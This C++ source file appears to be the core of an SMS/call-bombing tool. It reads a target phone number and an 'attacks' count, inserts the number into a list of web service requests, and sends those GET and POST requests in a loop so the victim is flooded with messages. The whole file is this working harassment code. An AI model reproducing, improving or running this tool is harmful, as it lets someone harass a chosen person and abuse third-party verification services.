#include "ServiceExecutor.hpp"

#include <thread>
#include <iostream>

ServiceExecutor::ServiceExecutor()
{
    this->Setup();
}

ServiceExecutor::~ServiceExecutor()
{
}

void ServiceExecutor::Execute()
{
    std::cout << "Attacks count: " << this->m_config.attacks << std::endl;
    for (auto i = 0; i < this->m_config.attacks; i++)
    {
        for (auto &service : this->m_services)
        {
            std::cout << "[+] " << service.name << " started" << std::endl;

            auto headers = this->m_myCurl.AddHeaders(service.headers);
            std::string_view result;
            switch (service.requestType)
            {
            case RequestType::GET:
                service.url = this->ReplacePhonePlaceholder(service.url, this->m_config.phone);
                result = this->m_myCurl.PerformGetRequest(service.protocolType, service.url, headers);
                break;

            case RequestType::POST:
                service.payload = this->ReplacePhonePlaceholder(service.payload, this->m_config.phone);
                result = this->m_myCurl.PerformPostRequest(service.protocolType, service.url, headers, service.payload);
                break;

            default:
                throw std::invalid_argument("Invalid request type value");
                break;
            }

            result.length() < 150 ? std::cout << "\tResponse: " << result << std::endl
                                              << std::endl
                                  : std::cout << "\tResponse is so large. Maybe invalid request\n"
                                              << std::endl;
        }

        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

void ServiceExecutor::Setup()
{
    ConfigParser configParser;
    ServiceParser serviceParser;

    std::cout << "[#] Setup settings..." << std::endl;

    this->m_config = configParser.GetParsedConfig();
    this->m_services = serviceParser.GetParsedServices();
    if (this->m_services.empty())
    {
        throw std::runtime_error("Failed to get parsed services.");
    }

    std::cout << "\n[+] All necessary information has been successfully loaded into the system." << std::endl;
}

std::string ServiceExecutor::ReplacePhonePlaceholder(const std::string &str, std::string_view value)
{
    if (str.empty() || value.empty())
    {
        throw std::invalid_argument("Empty input data in placeholder's function.");
    }

    std::size_t pos = 0;
    std::string_view placeholder = "${phone}";
    std::string result = str;
    while ((pos = str.find(placeholder, pos)) != std::string::npos)
    {
        result.replace(pos, placeholder.length(), value);
        pos += value.length();
    }

    return result;
}
